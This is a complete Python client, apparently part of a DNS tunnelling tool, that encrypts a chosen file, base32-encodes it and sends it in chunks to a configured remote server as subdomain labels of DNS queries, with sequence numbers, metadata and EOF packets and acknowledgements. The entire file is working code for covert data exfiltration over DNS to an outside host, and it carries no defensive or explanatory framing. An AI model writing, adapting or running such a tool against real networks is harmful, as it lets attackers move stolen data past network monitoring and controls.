import base64
import math
from dns import resolver
import config
from crypto_module import encrypt
import sys 
import os

def send_data(data: bytes, dns_resolver):
    encrypted_data = encrypt(data, config.AES_KEY)

    encoded_data = base64.b32encode(encrypted_data).decode('utf-8').replace('=', '')

    chunk_size = 60 
    chunks = [encoded_data[i:i + chunk_size] for i in range(0, len(encoded_data), chunk_size)]
    
    query_name = '.'.join(reversed(chunks)) + '.' + config.TUNNEL_DOMAIN
    
    print(f"[*] Sending Query: {query_name}")
    
    retries = 3
    ack_received = False
    while not ack_received and retries > 0:
        try:
            answers = dns_resolver.resolve(query_name, 'A', lifetime=5.0) 
            if answers and answers[0].to_text() == "127.0.0.1":
                print("[+] ACK Received!")
                ack_received = True
                return True 
        except (resolver.NoAnswer, resolver.Timeout):
            print(f"[!] Timeout or NoAnswer. Retrying... ({retries-1} left)")
            retries -= 1
        except Exception as e:
            print(f"[!] Error sending DNS query: {e}")
            retries -= 1
            
    return False 

if __name__ == "__main__":

    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <filename>")
        sys.exit(1) 

    file_to_send = sys.argv[1] 

    if not os.path.exists(file_to_send):
        print(f"Error: File '{file_to_send}' not found.")
        sys.exit(1)

    dns_resolver = resolver.Resolver()
    dns_resolver.nameservers = [config.SERVER_IP]
    dns_resolver.port = config.DNS_PORT

    print(f"--- Sending metadata for file: {file_to_send} ---")
    packet_type_meta = b'\x00'
    filename_bytes = file_to_send.encode('utf-8')

    metadata_packet = packet_type_meta + len(filename_bytes).to_bytes(1, 'big') + filename_bytes
    if not send_data(metadata_packet, dns_resolver):
        print("[!] Failed to send metadata packet. Aborting.")
        exit(1)

    seq_num = 0
    with open(file_to_send, "rb") as f:
        while True:
            file_chunk = f.read(100)
            if not file_chunk:
                break

            packet_type_data = b'\x01'
            seq_num_bytes = seq_num.to_bytes(4, 'big')

            packet_to_send = packet_type_data + seq_num_bytes + file_chunk
            
            print(f"--- Sending data chunk with sequence number: {seq_num} ---")
            if not send_data(packet_to_send, dns_resolver):
                print(f"[!] Failed to send packet {seq_num}. Aborting.")
                break
            
            seq_num += 1

    print("[*] End of file reached. Sending EOF packet.")
    packet_type_eof = b'\x02'

    eof_packet = packet_type_eof
    send_data(eof_packet, dns_resolver)